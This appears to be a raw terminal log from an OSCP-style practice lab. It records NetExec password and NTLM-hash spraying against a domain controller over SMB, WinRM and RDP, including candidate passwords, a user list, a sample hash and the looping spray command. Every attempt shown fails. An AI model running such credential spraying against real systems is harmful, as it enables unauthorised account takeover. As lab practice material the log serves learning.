+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Janice.Turner:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Thomas.Robinson:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Aimee.Hunt:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Georgina.Begum:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Oliver.Gray:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Kenneth.Coles:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Carol.Webb:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Joan.North:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Jane.Booth:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Frank.Farrell:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Shane.Mitchell:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Jamie.Thomas:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Linda.Patel:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Emily.Bishop:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Lawrence.Kay:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Donna.Johnson:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Luke.Martin:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Chelsea.Byrne:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Sandra.Craig:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Leonard.Morris:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\tom_admin:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\tom.kinney:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\celia.almeda:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\krbtgt:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Guest:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Administrator:EricLikesRunning800 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\eric.wallows:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\web_svc:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\john.dorian:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\sql_svc:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Janice.Turner:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Thomas.Robinson:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Aimee.Hunt:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Georgina.Begum:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Oliver.Gray:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Kenneth.Coles:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Carol.Webb:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Joan.North:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Jane.Booth:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Frank.Farrell:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Shane.Mitchell:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Jamie.Thomas:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Linda.Patel:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Emily.Bishop:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Lawrence.Kay:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Donna.Johnson:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Luke.Martin:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Chelsea.Byrne:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Sandra.Craig:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Leonard.Morris:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\tom_admin:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\tom.kinney:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\celia.almeda:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\krbtgt:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Guest:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Administrator:Dolphin1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\eric.wallows:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\web_svc:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\john.dorian:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\sql_svc:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Janice.Turner:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Thomas.Robinson:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Aimee.Hunt:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Georgina.Begum:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Oliver.Gray:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Kenneth.Coles:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Carol.Webb:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Joan.North:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Jane.Booth:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Frank.Farrell:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Shane.Mitchell:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Jamie.Thomas:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Linda.Patel:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Emily.Bishop:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Lawrence.Kay:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Donna.Johnson:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Luke.Martin:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Chelsea.Byrne:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Sandra.Craig:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Leonard.Morris:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\tom_admin:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\tom.kinney:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\celia.almeda:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\krbtgt:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Guest:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Administrator:Diamond1 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\eric.wallows:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\web_svc:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\john.dorian:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\sql_svc:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Janice.Turner:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Thomas.Robinson:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Aimee.Hunt:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Georgina.Begum:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Oliver.Gray:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Kenneth.Coles:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Carol.Webb:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Joan.North:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Jane.Booth:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Frank.Farrell:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Shane.Mitchell:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Jamie.Thomas:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Linda.Patel:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Emily.Bishop:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Lawrence.Kay:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Donna.Johnson:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Luke.Martin:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Chelsea.Byrne:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Sandra.Craig:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Leonard.Morris:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\tom_admin:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\tom.kinney:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\celia.almeda:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\krbtgt:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Guest:December31 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Administrator:December31 STATUS_LOGON_FAILURE
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[34m[*][0m Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:oscp.exam)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m DC01\eric.wallows:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m DC01\web_svc:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m DC01\john.dorian:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m DC01\sql_svc:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m DC01\Janice.Turner:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m DC01\Thomas.Robinson:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m DC01\Aimee.Hunt:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m DC01\Georgina.Begum:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m DC01\Oliver.Gray:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m DC01\Kenneth.Coles:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m DC01\Carol.Webb:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m DC01\Joan.North:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m DC01\Jane.Booth:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m DC01\Frank.Farrell:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m DC01\Shane.Mitchell:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m DC01\Jamie.Thomas:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m DC01\Linda.Patel:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m DC01\Emily.Bishop:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+^C[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m DC01\Lawrence.Kay:EricLikesRunning800
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m DC01\Donna.Johnson:EricLikesRunning800
+^C/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.h
+azmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[31m[-][0m DC01\Luke.Martin:EricLikesRunning800
+^CException ignored on threading shutdown:
+Traceback (most recent call last):
+  File "/usr/lib/python3.13/threading.py", line 1537, in _shutdown
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+    atexit_call()
+  File "/usr/lib/python3.13/threading.py", line 1508, in <lambda>
+    _threading_atexits.append(lambda: func(*arg, **kwargs))
+  File "/usr/lib/python3.13/concurrent/futures/thread.py", line 31, in _python_exit
+    t.join()
+  File "/usr/lib/python3.13/threading.py", line 1095, in join
+    self._handle.join(timeout)
+KeyboardInterrupt:
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/AD/Loot[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/AD/Loot[0m]
+└─[1m[34m$[0m for i in smb rdp winrm; do nxc $i 10.10.197.146 -u users.txt -H hashes.txt --local-auth ;done
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[34m[*][0m Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:DC01) ([1m[32msigning:True[0m) ([1m[36mSMBv1:None[0m)[1m[33m (Null Auth:True)[0m
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\eric.wallows:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\web_svc:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\john.dorian:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\sql_svc:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Janice.Turner:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Thomas.Robinson:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Aimee.Hunt:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Georgina.Begum:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Oliver.Gray:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Kenneth.Coles:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Carol.Webb:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Joan.North:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
